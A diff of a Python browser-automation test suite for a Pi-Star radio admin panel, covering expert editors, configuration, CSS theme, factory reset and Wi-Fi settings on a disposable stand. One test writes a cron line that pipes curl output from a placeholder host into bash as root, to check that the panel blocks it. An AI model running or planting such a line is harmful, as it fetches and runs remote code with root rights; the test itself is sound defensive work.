@@ -2,13 +2,15 @@
 """Exercise real settings and signed archive transactions on a disposable QA stand."""
 
 import argparse
-from hashlib import sha256
+import base64
+from hashlib import pbkdf2_hmac, sha256
 from ipaddress import ip_address
 import json
 from pathlib import Path
 import re
 import subprocess
 import sys
+import time
 from tempfile import TemporaryDirectory
 from urllib.parse import quote, urlsplit
 from zipfile import BadZipFile, ZipFile
@@ -27,8 +29,6 @@ FAILED_AND_RECOVERED = ["dmrgateway.service ok", "mmdvmhost.service fail", *REST
 EVENTS = "/run/pistar-qa/events"
 FAULT = "/run/pistar-qa/fail-next-mmdvmhost"
 STATE = "/var/lib/pistar-panel-config/"
-ARCHIVE = tid("station-backup")
-CHOOSE = ARCHIVE + " input[type=file]"
 
 
 def loopback_origin(value):
@@ -104,47 +104,6 @@ class Stand:
         return snapshot
 
 
-def backup_page(v):
-    v.nav("backup")
-    wait("archive session not ready", lambda: v.field(CHOOSE + ":enabled"))
-
-
-def download(v, folder, expected):
-    path = folder / "Pi-Star-PRIVATE.zip"
-    if path.exists():
-        raise AssertionError("archive download destination already exists")
-    v.click(ARCHIVE + " a[download]")
-    wait("PRIVATE ZIP download missing", path.is_file)
-    with ZipFile(path) as z:
-        equal("PRIVATE ZIP members", z.namelist(), list(NAMES))
-        equal("PRIVATE ZIP signature envelope",
-              bool(re.fullmatch(rb"Pi-Star PRIVATE archive v1 \| [0-9a-f]{64}", z.comment)), True)
-        same_pair("downloaded ZIP", [z.read(name) for name in NAMES], expected)
-    return path
-
-
-def archive_button(v, label):
-    el = v.js("return button(arguments[0])", label)
-    if not el:
-        raise AssertionError(f"missing archive button: {label}")
-    v.command(f"/element/{el[ELEMENT]}/click", {})
-
-
-def archive_notice(v, role, fragment):
-    wait("expected archive " + role + ": " + fragment, lambda: fragment in v.js(
-        "return text(document.querySelector(arguments[0]))", ARCHIVE + f' [role="{role}"]'))
-
-
-def preview(v, path, changed):
-    v.choose_file(CHOOSE, path)
-    archive_button(v, "Проверить архив")
-    archive_notice(v, "status", "Архив проверен")
-    label = "будет заменён" if changed else "без изменений"
-    equal("archive preview rows", v.js("return all(arguments[0]).map(text)", ARCHIVE + " li"),
-          [f"{name} — {label}" for name in NAMES])
-    equal("restore confirmation offered", v.js("return !!button('Подтвердить восстановление')"), changed)
-
-
 def apply_settings(v, fail=False):
     v.nav("settings")
     v.ready(INITIAL)
@@ -159,64 +118,40 @@ def apply_settings(v, fail=False):
 
 
 def exercise(v, stand, folder, original, changed):
+    """Station settings: apply, confirmed operator rollback and an injected service failure."""
     history = stand.restarts()
     v.ready(INITIAL)
-    backup_page(v)
-    first = download(v, folder, original).rename(folder / "original.zip")
-    preview(v, first, changed=False)
-
     apply_settings(v)
     history += RESTARTS
     stand.check_state("settings applied", changed, original, history)
     print("PASS on-disk settings: Callsign=DEMO1 -> DEMO2; master Address=192.0.2.11 -> 192.0.2.12; "
           "all other bytes unchanged; applied SHA256: " +
-          ", ".join(f"{name} {sha256(data).hexdigest()}" for name,data in zip(NAMES,changed)), flush=True)
-    backup_page(v)
-    second = download(v, folder, changed)
-    preview(v, first, changed=True)
-    stand.check_state("restore preview", changed, original, history)
-    archive_button(v, "Подтвердить восстановление")
-    archive_notice(v, "status", "Файлы восстановлены")
-    history += RESTARTS
-    snapshot = stand.check_state("archive restored", original, changed, history)
-    print("PASS settings apply and signed archive restore; original SHA256: " +
-          ", ".join(f"{n} {sha256(b).hexdigest()}" for n, b in zip(NAMES, original)), flush=True)
+          ", ".join(f"{name} {sha256(data).hexdigest()}" for name, data in zip(NAMES, changed)), flush=True)
 
-    stand.exec("touch", FAULT)
-    apply_settings(v, fail=True)
-    history += FAILED_AND_RECOVERED
-    after = stand.check_state("failed settings apply", original, changed, history)
-    equal("failed settings apply preserved previous.json bytes", after == snapshot, True)
-
-    backup_page(v)
-    preview(v, second, changed=True)
-    stand.check_state("failed-restore preview", original, changed, history)
-    stand.exec("touch", FAULT)
-    archive_button(v, "Подтвердить восстановление")
-    archive_notice(v, "alert", "Операция не выполнена")
-    history += FAILED_AND_RECOVERED
-    after = stand.check_state("failed archive restore", original, changed, history)
-    equal("failed restore preserved previous.json bytes", after == snapshot, True)
-    preview(v, first, changed=False)
-    v.nav("settings")
-    v.ready(INITIAL)
-    print("PASS injected settings and archive failures: both files, rollback snapshot, "
-          "pending state, service recovery order and UI reread", flush=True)
-
-    apply_settings(v)
-    history += RESTARTS
-    stand.check_state("before manual rollback", changed, original, history)
     v.settings("rollback")
     same_pair("opening confirmation did not write", stand.pair(), changed)
     equal("opening confirmation did not restart services", stand.restarts(), history)
     v.settings("confirm-rollback")
     v.notice("status", "настройки восстановлены и перечитаны")
     v.ready(INITIAL)
+    history += RESTARTS
     same_pair("operator rollback", stand.pair(), original)
     equal("operator rollback consumed snapshot", stand.exists(STATE + "previous.json"), False)
     equal("operator rollback left no pending transaction", stand.exists(STATE + "pending.json"), False)
-    equal("operator rollback restart order", stand.restarts(), history + RESTARTS)
+    equal("operator rollback restart order", stand.restarts(), history)
     print("PASS confirmed operator rollback: both original files byte-identical, previous.json consumed", flush=True)
+
+    stand.exec("touch", FAULT)
+    apply_settings(v, fail=True)
+    history += FAILED_AND_RECOVERED
+    same_pair("failed settings apply", stand.pair(), original)
+    equal("failed settings apply restarts", stand.restarts(), history)
+    equal("failed settings apply consumed the fault", stand.exists(FAULT), False)
+    equal("failed settings apply left no pending transaction", stand.exists(STATE + "pending.json"), False)
+    v.nav("services")  # leave the page so the form is read again from the server
+    v.nav("settings")
+    v.ready(INITIAL)
+    print("PASS injected settings failure: both files restored, service recovery order, no pending state, UI reread", flush=True)
 
 
 def exercise_services(v, stand, original):
@@ -267,17 +202,1114 @@ def exercise_services(v, stand, original):
           "fresh GET, exact two-INI comparison, confirmed rollback; CSRF 403, invalid rule 422, stale 409, no extra restarts",flush=True)
 
 
+def exercise_expert(v, stand, origin, original):
+    """Expert Quick Edit and Full Edit through Chromium against the real helper."""
+    host, gw = original
+
+    def go(fragment, ready):
+        v.command("/url", {"url": origin + "/manage/#expert"})
+        v.command("/url", {"url": origin + "/manage/#" + fragment})
+        wait(fragment + " did not load", lambda: v.js(ready))
+
+    def post(api, body, csrf):
+        return v.command('/execute/async', {'script': """const [url,body,csrf,done]=arguments;
+          fetch(url,{method:'POST',headers:{'Content-Type':'application/json','X-PiStar-CSRF':csrf},
+          body:JSON.stringify(body)}).then(r=>done(r.status))""", 'args': [api, body, csrf]})
+
+    cc = 'input[aria-label="DMR ColorCode"]'
+    go("expert-mmdvmhost", f"return document.querySelector('{cc}')?.value === '1'")
+    history = stand.restarts()
+    # 1. change one value
+    v.type_into(cc, "5")
+    v.click('form input[type=submit]')
+    wait("Quick Edit save not acknowledged", lambda: v.js("return document.body.innerText.includes('Changes applied.')"))
+    host5 = host.replace(b"ColorCode=1\n", b"ColorCode=5\n")
+    assert host5 != host
+    same_pair("Quick Edit ColorCode 1 -> 5", stand.pair(), (host5, gw))
+    history += ["mmdvmhost.service ok"]
+    equal("Quick Edit restarts", stand.restarts(), history)
+    # 2. reopen shows the stored value
+    go("expert-mmdvmhost", f"return document.querySelector('{cc}')?.value === '5'")
+    # 3. unchanged form writes nothing and restarts nothing
+    v.click('form input[type=submit]')
+    wait("no-op save not acknowledged", lambda: v.js("return document.body.innerText.includes('Changes applied.')"))
+    same_pair("Quick Edit no-op save", stand.pair(), (host5, gw))
+    equal("Quick Edit no-op restarts", stand.restarts(), history)
+    # 4. stale form: the file changes underneath the open page
+    go("expert-mmdvmhost", f"return document.querySelector('{cc}')?.value === '5'")
+    stand.exec("sed", "-i", "s/^ColorCode=5$/ColorCode=6/", "/etc/MMDVM-Host.ini")
+    host6 = host.replace(b"ColorCode=1\n", b"ColorCode=6\n")
+    v.type_into(cc, "7")
+    v.click('form input[type=submit]')
+    wait("stale save not refused", lambda: v.js("return document.body.innerText.includes('changed since this page was loaded')"))
+    same_pair("Quick Edit stale form", stand.pair(), (host6, gw))
+    equal("Quick Edit stale restarts", stand.restarts(), history)
+    # 5. missing CSRF header
+    state = v.command('/execute/async', {'script': "fetch(arguments[0]).then(r=>r.json()).then(arguments[arguments.length-1])",
+                                         'args': ["/manage/api/expert/mmdvmhost"]})
+    equal("Quick Edit without CSRF", post("/manage/api/expert/mmdvmhost", {"revision": state["revision"], "values": {"DMR": {"ColorCode": "9"}}}, ""), 403)
+    same_pair("Quick Edit CSRF refusal", stand.pair(), (host6, gw))
+    # 6. Full Edit DMRGateway: whole file, restarts MMDVMHost then DMRGateway
+    go("expert-full-dmrgateway", "return document.querySelector('textarea')?.value.includes('[General]')")
+    new_gw = gw.decode().replace("[General]", "# edited in Full Edit\n[General]", 1)
+    v.js("const t=document.querySelector('textarea'); t.value=arguments[0]; t.dispatchEvent(new Event('input',{bubbles:true}))", new_gw)
+    v.click('form input[type=submit]')
+    wait("Full Edit save not acknowledged", lambda: v.js("return document.body.innerText.includes('Changes applied.')"))
+    same_pair("Full Edit DMRGateway", stand.pair(), (host6, new_gw.encode()))
+    history += ["mmdvmhost.service ok", "dmrgateway.service ok"]
+    equal("Full Edit restarts", stand.restarts(), history)
+    equal("Full Edit DMRGateway mode", stand.exec("stat", "-c", "%U:%G %a", "/etc/DMRGateway.ini").stdout.decode().strip(), "mmdvm:mmdvm 600")
+    # 7. System Cron refuses blocked patterns without touching the file
+    cron_before = stand.read("/etc/crontab") if stand.exists("/etc/crontab") else None
+    go("expert-full-cron", "return !!document.querySelector('textarea')")
+    v.js("const t=document.querySelector('textarea'); t.value=arguments[0]; t.dispatchEvent(new Event('input',{bubbles:true}))",
+         "*/5 * * * * root curl http://example.invalid/x | bash\n")
+    v.click('form input[type=submit]')
+    wait("blocked cron line not reported", lambda: v.js("return document.body.innerText.includes('pipes downloaded content directly into a shell')"))
+    equal("System Cron unchanged", stand.read("/etc/crontab") if stand.exists("/etc/crontab") else None, cron_before)
+    equal("System Cron restarts", stand.restarts(), history)
+    # 8. API Keys: a BrandMeister API v2 key is a long JWT (beyond the 512-character INI limit)
+    stand.exec("rm", "-f", "/etc/bmapi.key")
+    go("expert-full-apikeys", "return !!document.querySelector('[aria-label=\"BrandMeister API Key apikey\"]')")
+    jwt = "eyJhbGciOiJSUzUxMiJ9." + "Q" * 700 + "." + "s" * 342
+    v.type_into('[aria-label="BrandMeister API Key apikey"]', jwt)
+    v.js("document.querySelector('[aria-label=\"BrandMeister API Key apikey\"]').closest('form').querySelector('input[type=submit]').click()")
+    wait("API key save not acknowledged", lambda: v.js("return document.body.innerText.includes('BrandMeister API Key saved.')"))
+    equal("BM API key file", stand.read("/etc/bmapi.key").decode(), "[key]\napikey=" + jwt + "\n\n")
+    equal("BM API key owner and mode", stand.exec("stat", "-c", "%U %a", "/etc/bmapi.key").stdout.decode().strip(), "pistar-wizard 600")
+    equal("API key restarts", stand.restarts(), history)
+    stand.exec("rm", "-f", "/etc/bmapi.key")
+    print("PASS Chromium Expert: Quick Edit ColorCode 1 -> 5 with exact file comparison and one MMDVMHost restart, "
+          "reopen shows 5, unchanged form writes nothing, stale form 409 keeps the newer file, missing CSRF 403; "
+          "Full Edit DMRGateway writes the whole text, keeps mmdvm:mmdvm 600 and restarts MMDVMHost then DMRGateway; "
+          "System Cron refuses a blocked pattern without writing; API Keys saves a 1 KB BrandMeister JWT 0600 without restarts", flush=True)
+
+
+def exercise_configure(v, stand, origin, original):
+    """Configuration page (admin/configure.php) through Chromium against the real helper."""
+    host, gw = original
+    marker = "/etc/dstar-radio.mmdvmhost"
+    stand.exec("sh", "-c", f"printf '[Modem]\\nHardware=zumspotgpio\\n' > {marker}; mkdir -p /etc/pistar-wizard; "
+               "printf '#!/bin/sh\\necho \"$*\" >> /run/pistar-qa/systemd-run\\n' > /usr/bin/systemd-run; chmod 755 /usr/bin/systemd-run")
+    marker_text = stand.read(marker)
+
+    def load():
+        v.command("/url", {"url": origin + "/manage/#expert"})
+        v.command("/url", {"url": origin + "/manage/#configuration"})
+        wait("configuration did not load", lambda: v.js("return document.querySelectorAll('.section h2').length > 3"))
+
+    def apply_first():
+        v.js("window.qaBeforeApply = 1; document.querySelector('.section input[value=\"Apply Changes\"]').click()")
+
+    def applied():
+        # A successful Apply reloads the whole page (like configure.php) and
+        # shows the result again; wait for the reloaded document.
+        wait("page reloaded after Apply", lambda: v.js(
+            "return !window.qaBeforeApply && document.body.innerText.includes('Your configuration has been applied.')"
+            " && !document.body.innerText.includes('Reloading') && document.querySelectorAll('.section h2').length > 3"), timeout=20)
+
+    def message(fragment):
+        wait("expected: " + fragment, lambda: fragment in v.js("return document.body.innerText"))
+
+    def post(body):
+        return v.command('/execute/async', {'script': """const [body,done]=arguments;
+          fetch('/manage/api/configure').then(r=>r.json()).then(s=>fetch('/manage/api/configure',{method:'POST',
+          headers:{'Content-Type':'application/json','X-PiStar-CSRF':s.csrf},body:JSON.stringify({revision:s.revision,form:body})}))
+          .then(async r=>done([r.status, await r.text()]))""", 'args': [body]})
+
+    load()
+    titles = v.js("return [...document.querySelectorAll('.section h2')].map(h => h.textContent)")
+    for t in ("Gateway Hardware Information", "Control Software", "MMDVMHost Configuration", "General Configuration",
+              "DMR Configuration", "Firewall Configuration", "Remote Access Password"):
+        assert t in titles, (t, titles)
+    history = stand.restarts()
+    # 1. an untouched form writes nothing and restarts nothing
+    print("configure step: 1. an untouched form writes nothing and restarts nothing", flush=True)
+    apply_first()
+    applied()
+    same_pair("untouched Configuration", stand.pair(), original)
+    equal("untouched Configuration restarts", stand.restarts(), history)
+    equal("untouched Configuration marker", stand.read(marker), marker_text)
+    # 2. one field: DMR Colour Code 1 -> 7 changes exactly that line and restarts the radio services
+    print("configure step: 2. one field: DMR Colour Code 1 -> 7 changes exactly that line and restarts the radio services", flush=True)
+    load()
+    v.js("const s=document.querySelector('select[aria-label=\"dmrColorCode\"]'); s.value='7'; s.dispatchEvent(new Event('change',{bubbles:true}))")
+    apply_first()
+    applied()
+    host7 = host.replace(b"ColorCode=1\n", b"ColorCode=7\n")
+    assert host7 != host
+    same_pair("Configuration Colour Code 1 -> 7", stand.pair(), (host7, gw))
+    history += ["dmrgateway.service ok", "mmdvmhost.service ok"]
+    equal("Configuration restarts", stand.restarts(), history)
+    load()
+    equal("Colour Code reread", v.js("return document.querySelector('select[aria-label=\"dmrColorCode\"]').value"), "7")
+    # 3. invalid input is refused (422) without writes
+    print("configure step: 3. invalid input is refused (422) without writes", flush=True)
+    status, body = post({"dmrColorCode": "99"})
+    equal("invalid Colour Code status", status, 422)
+    same_pair("invalid Colour Code", stand.pair(), (host7, gw))
+    equal("invalid Colour Code restarts", stand.restarts(), history)
+    # 4. a stale page is refused (409) and keeps the newer file
+    print("configure step: 4. a stale page is refused (409) and keeps the newer file", flush=True)
+    load()
+    stand.exec("sed", "-i", "s/^Beacons=0$/Beacons=1/", "/etc/MMDVM-Host.ini")
+    hostb = host7.replace(b"Beacons=0\n", b"Beacons=1\n")
+    v.js("const s=document.querySelector('select[aria-label=\"dmrColorCode\"]'); s.value='3'; s.dispatchEvent(new Event('change',{bubbles:true}))")
+    apply_first()
+    message("changed since this page was loaded")
+    same_pair("stale Configuration", stand.pair(), (hostb, gw))
+    equal("stale Configuration restarts", stand.restarts(), history)
+    # 5. Remote Access Password: its own form, written 0600, no radio restart, mismatch refused
+    print("configure step: 5. Remote Access Password: its own form, written 0600, no radio restart, mismatch refused", flush=True)
+    load()
+    v.type_into('input[aria-label="Password"]', "qa-Secret-1")
+    v.type_into('input[aria-label="Confirm Password"]', "qa-Secret-2")
+    v.js("[...document.querySelectorAll('input[type=button]')].find(b => b.value === 'Set Password').click()")
+    message("entries do not match")
+    equal("mismatched password not written", stand.exists("/etc/pistar-wizard/admin-password"), False)
+    v.type_into('input[aria-label="Confirm Password"]', "qa-Secret-1")
+    v.js("window.qaBeforeApply = 1; [...document.querySelectorAll('input[type=button]')].find(b => b.value === 'Set Password').click()")
+    applied()
+    equal("password file", stand.read("/etc/pistar-wizard/admin-password"), b"qa-Secret-1\n")
+    equal("password file mode", stand.exec("stat", "-c", "%a", "/etc/pistar-wizard/admin-password").stdout.decode().strip(), "600")
+    same_pair("password form leaves radio files", stand.pair(), (hostb, gw))
+    equal("password form restarts", stand.restarts(), history)
+    equal("HTTPS service restart scheduled", stand.read("/run/pistar-qa/systemd-run"),
+          b"--quiet --collect --on-active=2 /usr/bin/systemctl restart pistar-wizard.service\n")
+    stand.exec("rm", "-f", marker, "/etc/pistar-wizard/admin-password", "/usr/bin/systemd-run", "/run/pistar-qa/systemd-run")
+    print("PASS Chromium Configuration: sections " + ", ".join(titles) + "; untouched Apply writes and restarts nothing; "
+          "Colour Code 1 -> 7 changes exactly that line and restarts DMRGateway then MMDVMHost, the page reloads and shows 7; "
+          "invalid value 422 and stale page 409 write nothing; Remote Access Password mismatch refused, "
+          "then written 0600 without radio restarts", flush=True)
+
+
+def exercise_css(v, stand, origin, original):
+    """Expert > CSS Tool and the theme it applies, through Chromium against the real helper."""
+    css = "/etc/pistar-css.ini"
+    stand.exec("rm", "-f", css)
+
+    def go(fragment, ready):
+        v.command("/url", {"url": origin + "/manage/#power"})
+        v.command("/url", {"url": origin + "/manage/#" + fragment})
+        wait(fragment + " did not load", lambda: v.js(ready))
+
+    def header_colour():
+        return v.js("return getComputedStyle(document.querySelector('.header')).backgroundColor")
+
+    def set_field(label, value):
+        v.js("const e=document.querySelector(`[aria-label=\"${arguments[0]}\"]`); e.value=arguments[1];"
+             "e.dispatchEvent(new Event(e.tagName==='SELECT'?'change':'input',{bubbles:true}))", label, value)
+
+    tables = "return document.querySelectorAll('.contentwide form table').length === 7"
+    go("expert-tool-css", tables)
+    wait("default banner colour", lambda: header_colour() == "rgb(221, 75, 57)")
+    equal("Lookup default", v.js("return document.querySelector('[aria-label=\"Lookup Service\"]').value"), "RadioID")
+    equal("CSS file absent before save", stand.exists(css), False)
+    history = stand.restarts()
+    # 1. save: every shown key written in classic format, root:root 0644, no restarts
+    set_field("Background Banners", "0000ff")
+    set_field("BannerH1 Enabled", "1")
+    set_field("BannerH1 Text", "QA Banner")
+    set_field("BannerExtText Text", "")
+    set_field("Lookup Service", "QRZ")
+    v.click(".contentwide form input[type=submit]")
+    wait("CSS save not acknowledged", lambda: v.js("return document.body.innerText.includes('Changes applied.')"))
+    expected = ("[Background]\nPage=edf0f5\nContent=ffffff\nBanners=0000ff\n\n[Text]\nBanners=ffffff\nBannersDrop=303030\n\n"
+                "[Tables]\nHeadDrop=8b0000\nBgEven=f7f7f7\nBgOdd=d0d0d0\n\n[Content]\nText=000000\n\n"
+                "[BannerH1]\nEnabled=1\nText=QA Banner\n\n[BannerExtText]\nEnabled=0\nText=none\n\n[Lookup]\nService=QRZ\n\n")
+    equal("CSS file", stand.read(css).decode(), expected)
+    equal("CSS file owner and mode", stand.exec("stat", "-c", "%U:%G %a", css).stdout.decode().strip(), "root:root 644")
+    equal("CSS save restarts", stand.restarts(), history)
+    same_pair("CSS save leaves radio files", stand.pair(), original)
+    # 2. the theme applies to the admin pages and the dashboard banner
+    go("expert-tool-css", tables)
+    wait("saved banner colour", lambda: header_colour() == "rgb(0, 0, 255)")
+    equal("Lookup reread", v.js("return document.querySelector('[aria-label=\"Lookup Service\"]').value"), "QRZ")
+    v.command("/url", {"url": origin + "/manage/"})
+    wait("dashboard BannerH1", lambda: v.js("return [...document.querySelectorAll('.header h1')].some(h => h.textContent === 'QA Banner')"))
+    equal("dashboard banner colour", header_colour(), "rgb(0, 0, 255)")
+    # 3. a stale page is refused and keeps the newer file
+    go("expert-tool-css", tables)
+    stand.exec("sed", "-i", "s/^Page=edf0f5$/Page=eeeeee/", css)
+    newer = stand.read(css)
+    set_field("Background Content", "fafafa")
+    v.click(".contentwide form input[type=submit]")
+    wait("stale CSS save not refused", lambda: v.js("return document.body.innerText.includes('changed since this page was loaded')"))
+    equal("stale CSS file", stand.read(css), newer)
+    # 4. Factory Reset: a wrong confirmation sends nothing, RESET removes the file
+    go("expert-tool-css", tables)
+    v.js("window.prompt = () => 'reset'; window.alert = m => { window.__alert = m; }")
+    v.js("[...document.querySelectorAll('input[type=button]')].find(b => b.value === 'Factory Reset').click()")
+    wait("wrong confirmation not reported", lambda: v.js("return window.__alert === 'Confirmation text did not match. Factory reset cancelled.'"))
+    equal("wrong confirmation keeps the file", stand.read(css), newer)
+    v.js("window.prompt = () => 'RESET'")
+    v.js("[...document.querySelectorAll('input[type=button]')].find(b => b.value === 'Factory Reset').click()")
+    wait("reset not acknowledged", lambda: v.js("return document.body.innerText.includes('Loading fresh configuration file(s)...')"))
+    equal("CSS file removed", stand.exists(css), False)
+    go("expert-tool-css", tables)
+    try:
+        wait("default colour after reset", lambda: header_colour() == "rgb(221, 75, 57)")
+    except AssertionError:
+        print("DEBUG css:", header_colour(), stand.exists(css), v.command('/execute/async', {'script':
+              "fetch('/manage/api/dashboard',{cache:'no-store'}).then(async r=>arguments[0]([r.status,(await r.text()).slice(-400)]))", 'args': []}), flush=True)
+        raise
+    equal("CSS restarts", stand.restarts(), history)
+    print("PASS Chromium CSS Tool: defaults shown without a file; save writes the classic file (root:root 644, empty value as none) "
+          "without restarts; banner colour and BannerH1 applied on admin pages and the dashboard, QRZ lookup saved and reread; stale page 409 "
+          "keeps the newer file; Factory Reset refuses a wrong confirmation and RESET removes the file, restoring the palette", flush=True)
+
+
+def exercise_factory(v, stand, origin, original):
+    """Configuration > Factory Reset through Chromium against the real helper and config_clean.zip."""
+    import io
+    marker, css = "/etc/dstar-radio.mmdvmhost", "/etc/pistar-css.ini"
+    share = stand.exec("sh", "-c", "ls /usr/share/pistar-radio/config_clean.zip").stdout.decode().strip()
+    zipped = ZipFile(io.BytesIO(stand.read(share)))
+    stand.exec("sh", "-c", f"printf '[Modem]\\nHardware=zumspotgpio\\n' > {marker}; printf '[Background]\\nPage=000000\\n' > {css}; rm -f /etc/ysfgateway")
+    modes = lambda: stand.exec("stat", "-c", "%U:%G %a", "/etc/MMDVM-Host.ini", "/etc/DMRGateway.ini").stdout.decode().split("\n")[:2]
+    before_modes = modes()
+    v.command("/url", {"url": origin + "/manage/#expert"})
+    v.command("/url", {"url": origin + "/manage/#configuration"})
+    wait("configuration did not load", lambda: v.js("return document.querySelectorAll('.section h2').length > 3"))
+    history = stand.restarts()
+    link = "[...document.querySelectorAll('.header a')].find(a => a.textContent === 'Factory Reset').click()"
+    # 1. Cancel in the confirmation writes nothing
+    v.js("window.confirm = () => false")
+    v.js(link)
+    same_pair("cancelled factory reset", stand.pair(), original)
+    equal("cancelled factory reset keeps the marker", stand.exists(marker), True)
+    # 2. OK restores every configuration from config_clean.zip
+    v.js("window.confirm = () => true")
+    v.js(link)
+    wait("factory reset not acknowledged", lambda: v.js("return document.body.innerText.includes('Loading fresh configuration file(s)...')"))
+    same_pair("factory configurations", stand.pair(), (zipped.read("mmdvmhost"), zipped.read("dmrgateway")))
+    equal("factory reset keeps owners and modes", modes(), before_modes)
+    equal("YSFGateway created from the defaults", stand.read("/etc/ysfgateway"), zipped.read("ysfgateway"))
+    equal("marker removed", stand.exists(marker), False)
+    equal("CSS override removed", stand.exists(css), False)
+    equal("factory reset restarts", stand.restarts(), history + ["dmrgateway.service ok", "mmdvmhost.service ok"])
+    print("PASS Chromium Factory Reset: Cancel writes nothing; OK restores MMDVMHost, DMRGateway and the missing YSFGateway "
+          "byte-for-byte from config_clean.zip with owners and modes kept, removes the controller marker and CSS override, "
+          "then restarts DMRGateway and MMDVMHost", flush=True)
+
+
+WPA_CONF = "/etc/wpa_supplicant/wpa_supplicant.conf"
+
+
+def wpa_psk(ssid, passphrase):
+    # Independent of the helper: what wpa_passphrase prints (PBKDF2-HMAC-SHA1, 4096 rounds, 32 bytes).
+    return pbkdf2_hmac("sha1", passphrase.encode(), ssid.encode(), 4096, 32).hex()
+
+
+def exercise_wifi(v, stand, origin, original):
+    """Wi-Fi page (admin/wifi.php) with the wpa_supplicant backend, through Chromium against the real helper.
+
+    run.sh --wifi sets WIFI_BACKEND=wpa_supplicant in the stand's pistar.conf. The container has no
+    wlan0: saves report it, and Reset / Scan must say so cleanly. Test-only passphrases are never printed."""
+    old_first, old_second, new_second = "qa-first-old-pass", "qa-second-old-pass", "qa-second-new-pass"
+    header = "ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev\nupdate_config=1\nap_scan=1\nfast_reauth=1\ncountry=GB\n\n"
+    first = ("network={\n\t#ssid=\"QA-First\"\n\tssid=" + b"QA-First".hex() + "\n\tpsk=" + wpa_psk("QA-First", old_first) +
+             "\n\tid_str=\"0\"\n\tpriority=100\n\tscan_ssid=1\n}\n")
+    second_hash = wpa_psk("QA-Second", old_second)
+    second = "network={\n\tssid=\"QA-Second\"\n\tpsk=" + second_hash + "\n\tkey_mgmt=WPA-PSK\n\tpriority=99\n}\n"
+    trailer = "\n# kept verbatim\n"
+    fixture = header + first + "\n" + second + trailer
+    stand.exec("sh", "-c", 'mkdir -p /etc/wpa_supplicant && printf "%s" "$1" > "$2" && chown root:root "$2" && chmod 600 "$2"',
+               "sh", fixture, WPA_CONF)
+    secrets = (old_first, old_second, new_second, second_hash, wpa_psk("QA-First", old_first))
+
+    def on_disk():
+        return stand.read(WPA_CONF).decode()
+
+    def meta():
+        owner, mode, inode = stand.exec("stat", "-c", "%U:%G %a %i", WPA_CONF).stdout.decode().split()
+        return owner + " " + mode, inode
+
+    def go(fragment, boxes=None):
+        v.command("/url", {"url": origin + "/manage/#power"})
+        v.command("/url", {"url": origin + "/manage/#" + fragment})
+        if boxes is None:
+            wait(fragment + " did not load", lambda: v.js("return document.body.innerText.includes('Wireless Information and Statistics')"))
+        else:
+            wait(fragment + " did not load", lambda: v.js("return document.querySelectorAll('.NetworkBoxes').length === arguments[0]"
+                                                          " && !!document.querySelector('select[aria-label=\"WiFi Country Code\"]')", boxes))
+
+    def ssids():
+        return v.js("return [...document.querySelectorAll('.NetworkBoxes input[type=text]')].map(e => e.value)")
+
+    def page_text(fragment):
+        wait("expected: " + fragment, lambda: fragment in v.js("return document.body.innerText"))
+
+    def api(script, *args):
+        return v.command('/execute/async', {'script': script, 'args': list(args)})
+
+    def post(body, with_csrf=True):
+        return api("""const [body,csrf,done]=arguments;
+          fetch('/manage/api/wifi').then(r=>r.json()).then(s=>fetch('/manage/api/wifi',{method:'POST',
+          headers:{'Content-Type':'application/json','X-PiStar-CSRF':csrf?s.csrf:''},body:JSON.stringify(Object.assign({revision:s.revision},body))}))
+          .then(async r=>done([r.status, await r.text()]))""", body, with_csrf)
+
+    def wifi_posts():
+        events = v.events()
+        status = {e["params"]["requestId"]: e["params"]["response"]["status"] for e in events if e["method"] == "Network.responseReceived"}
+        return [status.get(e["params"]["requestId"]) for e in events if e["method"] == "Network.requestWillBeSent"
+                and e["params"]["request"]["method"] == "POST" and e["params"]["request"]["url"] == origin + "/manage/api/wifi"]
+
+    def no_secrets(stage, text):
+        for s in secrets:
+            if s in text:
+                raise AssertionError(f"{stage}: a PSK or WPA hash reached the browser")
+
+    history = stand.restarts()
+    # 0. the page lists both networks; neither the GET nor the page carries a key
+    go("wifi-conf", 2)
+    equal("listed SSIDs", ssids(), ["QA-First", "QA-Second"])
+    equal("PSK fields start blank", v.js("return [...document.querySelectorAll('.NetworkBoxes input[type=password]')].map(e => e.value)"), ["", ""])
+    no_secrets("GET /manage/api/wifi", json.dumps(api("fetch('/manage/api/wifi').then(r=>r.text()).then(arguments[0])")))
+    no_secrets("rendered page", v.js("return document.documentElement.outerHTML"))
+    # 1. CSRF: a POST without the header is refused and writes nothing
+    status, _ = post({"action": "save", "country": "GB", "networks": [{"id": "1", "ssid": "QA-Second", "psk": ""}]}, with_csrf=False)
+    equal("save without CSRF", status, 403)
+    equal("CSRF refusal keeps the file", on_disk(), fixture)
+    # 2. Delete the first network and Save: one POST, only that block gone, root:root 0600
+    go("wifi-conf", 2)
+    v.events()
+    v.click('input[aria-label="Delete network 0"]')
+    wait("network box not removed", lambda: v.js("return document.querySelectorAll('.NetworkBoxes').length === 1"))
+    v.click('form input[type=submit]')
+    page_text("Wifi Settings Updated Successfully")
+    page_text("Interface wlan0 is not present")
+    equal("delete: POSTs", wifi_posts(), [200])
+    deleted = header + second + trailer
+    equal("delete: file", on_disk(), deleted)
+    equal("delete: owner and mode", meta()[0], "root:root 600")
+    go("wifi-conf", 1)
+    equal("delete: fresh GET", ssids(), ["QA-Second"])
+    # 3. Change the PSK of the remaining network: only its psk line changes, to the independent hash
+    v.events()
+    v.type_into('input[aria-label="PSK 0"]', new_second)
+    v.click('form input[type=submit]')
+    page_text("Wifi Settings Updated Successfully")
+    equal("PSK change: POSTs", wifi_posts(), [200])
+    changed = deleted.replace("\tpsk=" + second_hash + "\n", "\tpsk=" + wpa_psk("QA-Second", new_second) + "\n")
+    assert changed != deleted
+    equal("PSK change: file", on_disk(), changed)
+    equal("PSK change: owner and mode", meta()[0], "root:root 600")
+    if new_second in on_disk():
+        raise AssertionError("the passphrase was written in plain text")
+    # 4. Two tabs: tab A holds the form, tab B saves first; tab A's save is refused and installs nothing
+    go("wifi-conf", 1)
+    status, _ = post({"action": "save", "country": "DE", "networks": [{"id": "0", "ssid": "QA-Second", "psk": ""}]})
+    equal("tab B save", status, 200)
+    first_write = changed.replace("country=GB\n", "country=DE\n")
+    equal("tab B: file", on_disk(), first_write)
+    written = meta()
+    v.events()
+    v.js("const s=document.querySelector('select[aria-label=\"WiFi Country Code\"]'); s.value='FR'; s.dispatchEvent(new Event('change',{bubbles:true}))")
+    v.click('form input[type=submit]')
+    page_text("changed since this page was loaded")
+    equal("tab A: POSTs", wifi_posts(), [409])
+    equal("tab A: file is tab B's result", on_disk(), first_write)
